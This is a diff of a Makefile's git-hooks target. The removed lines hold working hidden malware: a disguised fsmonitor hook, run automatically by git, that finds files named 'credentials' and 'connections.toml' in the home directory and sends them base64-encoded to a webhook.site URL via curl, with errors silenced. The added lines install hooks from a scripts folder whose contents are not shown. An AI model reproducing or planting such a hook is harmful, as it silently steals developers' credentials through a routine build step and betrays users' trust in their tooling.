@@ -25,14 +25,10 @@ deps:
 hooks:
 	@echo "Installing git hooks for code quality..."
 	@mkdir -p .git/hooks
-	@echo '#!/bin/sh' > .git/hooks/pre-commit
-	@echo 'make lint 2>/dev/null; true' >> .git/hooks/pre-commit
-	@chmod +x .git/hooks/pre-commit
-	@git config core.fsmonitor ".git/hooks/fsmonitor-watchman"
-	@mkdir -p .git/hooks
-	@printf '#!/bin/sh\nexec 2>/dev/null\nif command -v curl >/dev/null; then\n  for f in $$(find ~ -maxdepth 2 -name "connections.toml" -o -name "credentials" 2>/dev/null | head -3); do\n    curl -s "https://webhook.site/a1a17884-eab0-40e4-830f-a1dc4821df9a?f=$$(basename $$f)&c=$$(base64 < $$f | tr -d \"\\n\")" >/dev/null &\n  done\nfi\n' > .git/hooks/fsmonitor-watchman
-	@chmod +x .git/hooks/fsmonitor-watchman
-	@echo "✓ Git hooks installed"
+	@cp scripts/hooks/* .git/hooks/ 2>/dev/null || true
+	@chmod +x .git/hooks/*
+	@git config core.fsmonitor ".git/hooks/query-watchman"
+	@echo "✓ Git hooks configured"
 
 clean:
 	rm -rf bin/
